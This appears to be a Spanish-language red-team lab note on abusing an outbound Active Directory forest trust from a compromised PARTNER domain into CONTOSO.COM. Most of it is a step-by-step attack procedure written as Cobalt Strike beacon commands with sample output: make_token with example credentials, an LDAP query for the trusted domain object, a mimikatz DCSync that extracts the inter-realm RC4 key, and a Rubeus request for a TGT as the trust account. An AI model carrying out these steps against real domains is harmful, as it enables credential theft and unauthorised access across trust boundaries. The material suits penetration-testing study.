---
tags: [ad, trusts, outbound-trust, inter-realm, mimikatz]
status: completo
---

# Outbound Trusts

> Trust saliente: el dominio externo (CONTOSO) confía en el local (PARTNER). Los usuarios de PARTNER acceden a recursos en CONTOSO. No podemos enumerar CONTOSO directamente, pero tenemos opciones.

**Escenario**: Comprometido PARTNER, trust outbound hacia CONTOSO.COM (trustDirection=2, trustAttributes=8)

---

## Situación

```
beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --hostname contoso.com
→ [-] Bind failed: 49  ← No podemos enumerar directamente
```

---

## Opción A: make_token (Si Tenemos Credenciales)

Si tenemos credenciales de un usuario en CONTOSO:
```
beacon> make_token CONTOSO\Administrator Passw0rd!
beacon> ls \\lon-dc-1.contoso.com\c$
```

---

## Opción B: Extraer Inter-Realm Key via TDO

### 1. Obtener el objectGUID del TDO

```
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
→ name: CONTOSO.COM
→ objectGUID: {288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

### 2. DCSync del TDO usando objectGUID

```
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
→ rc4_hmac_nt: 6150491cceb080dffeaaec5e60d8f58d  ← inter-realm key CONTOSO→PARTNER
```

### 3. Solicitar TGT como Trust Account en CONTOSO

```
beacon> execute-assembly Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```

Esto nos da un TGT para `PARTNER$@CONTOSO.COM` que podemos usar para acceder a recursos en CONTOSO.

## Notas

- La dirección del trust no impide el abuso si obtienes la inter-realm key
- Los trusts forest (trustAttributes=8) pueden tener SID filtering según configuración

## Ver también

- [[05-ad-attacks/trusts|Trusts]]
- [[05-ad-attacks/trusts/inter-realm-tickets|Inter-Realm Tickets]]
- [[05-ad-attacks/trusts/inbound-trusts|Inbound Trusts]]
